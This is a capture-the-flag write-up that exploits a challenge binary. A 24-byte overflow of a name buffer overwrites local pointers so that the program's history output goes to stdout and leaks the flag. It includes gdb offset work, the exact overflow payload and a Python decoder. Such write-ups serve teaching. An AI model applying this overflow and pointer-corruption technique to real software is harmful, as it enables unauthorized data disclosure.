# A program can hide another

### Static analysis

We can see different functions in the code but they don't seem to allow any exploitation. When we launch the program, we're inform that there is a secret and we know it's location. The goal of this challenge will be to get this secret. By analysing the code, we find that the secret is the content of the flag.txt file. Obviously, this file isnt readable, we'll have to find a way to get its data.

We can notice that a lot of data is stored on the heap, so we won't be able to modify their value with a buffer overflow. However, we can modify the pointers address if a buffer overflow is feasible. We have indeed a 24 bytes long buffer to store the player name below the pointers. and for a weird reason, the program allows the iser to input `sizeof(int) * 12` bytes, which is equal to 48. So we have 24 bytes available for the overflow. it isn't enough to overwrite the return address so we can just modify pointers address. We will deal with that.

The program is quite simple, the player has 50 coins and each game costs one coin. He can play a total of 50 games. At the end of each game, result are stored in a file *player_data.txt* This result are obtained wth a format string to get the decimal value of `games[*current]`. A game counter is also present.

If we think in a more abstract way, the program write into a file one byte of a buffer.
We want to get the flag, or to print all bytes of the buffer containing the flag. The logic is quite similar, and by changing the pointers, we will perform a data oriented programming attack and leak the flag.

We wish that `games` becomes `flag`, and `current` `games_played` (an incremental counter from 0). With that the flag will be written in *player_data.txt*. But an issue remain: we can't read *player_data.txt* ! We need to redirect the output into a file that we can read, and a trivial one is the **stdout** whose the file descriptor is **1**. We need to overwrite the file descriptor number of the history file by **1** to write our flag directly in the terminal.

But `history` is a pointer so we can't change its fields value. However, we can change one pointer value: `difficulty`. If we change the address of `difficulty` to the address of the file descriptor in `history`, we will eb able to change the output !

To exploit the program we'll need to write bytes during the program execution. However we cannot do that with a classic execution. A solution is set as the program input the output of a new shell, which with we'll be able to write bytes. In order to do that we can simply execute `sh | ./chall2`.


### Dynamic analysis

Let's continue the analysis with gdb. Because when we do `sh | ./chall2` we add some new environment variables modifying the addresses, we need to execute gdb in the same environment with `sh | gdb ./chall2`. You must also create a fake flag.txt if you don't want the program crashes.

Let's put a breakpoint after opening the history file, line 156: `echo "b 156"` (don't forget, we're in a shell !). Then run `echo r`.

Fortunately, we know the flag address, so we can calculate the address of our variables relatively to it. We must find the addresses of
 * flag
 * game_player
 * history file descriptor

and calculate the position in the stack compared to the buffer of:
 * games
 * current
 * difficulty
 
We can know execute the following commands:

```
gdb-peda$ echo "p flag"
sh-5.1$ $1 = 0x5655a1a0 "my_fake_flag"
gdb-peda$ echo "p &player->games_played"
sh-5.1$ $2 = (int *) 0x5655a1b8
gdb-peda$ echo "p &history->_fileno"
sh-5.1$ $3= (int *) 0x5655c788
gdb-peda$ echo "p &player_name"
sh-5.1$ $4 = (char (*)[24]) 0xffffcf18
gdb-peda$ echo "p &games"
sh-5.1$ $5 = (int **) 0xffffcf40
gdb-peda$ echo "p &current"
sh-5.1$ $6 = (int **) 0xffffcf3c
gdb-peda$ echo "p &difficulty"
sh-5.1$ $7 = (int **) 0xffffcf38
```

`flag` is at the same address as given at the begining so all is good.

With python, gdb or another tool we can calculate the offsets.

*0xffffcf38-0xffffcf18 = 32* So we need 32 bytes of padding and 16 bytes to overwrite the addresses. Exactly what we dispose !

### Exploitation

Lets run the challenge:

```
sh | ./chall2 
Welcome player ! A secret is hidden at 0x575571a0 but there's no way you can find it ahah !

sh-5.1$
```

flag is at 0x575571a0 so let's calculate the other addresses:
 * **player->games_played** is at 0x575571b8 (only the lowest byte differs and flag lowest byte is the same as in gdb)
 * **history->_fileno** is at 0x5655c788 - 0x5655a1a0 + 0x575571a0 = 0x57559788

We can inject our payload: 
`echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x88\x97\x55\x57\xb8\x71\x55\x57\xa0\x71\x55\x57"`

Set the difficulty (file descriptor) to 1: `echo 1`

And then perform some loops by repeating `echo 1` to be  quick for example

```
echo 1
sh-5.1$ Choose a number between 1 and 6

echo 1
sh-5.1$ >> 
The dice rolls and...
It's a 5 !
Sorry, bad number... Try again
Choose a game:
        1 - Roll the dice
        2 - More or less
        3 - Quit

>>
...
```

Then quit: `echo 3` and...

```
sh-5.1$ echo 3
sh-5.1$ 863008053;859135858;926118499;879519327;2171239;44;6;1449128395;0;
```

It isn't a flag ! It is because the format string interpret each data with its decimal value. We can notice that the format string takes an int so the flag is read 4 bytes by 4 bytes (in little endian).

We can decode the flag using python:

```python
>>> b"".join(
    bytes.fromhex(hex(int(n))[2:])[::-1]
    for n in "863008053;859135858;926118499;879519327;2171239".split(';')
)
b'5up3r_53cr37_fl4g!!'
```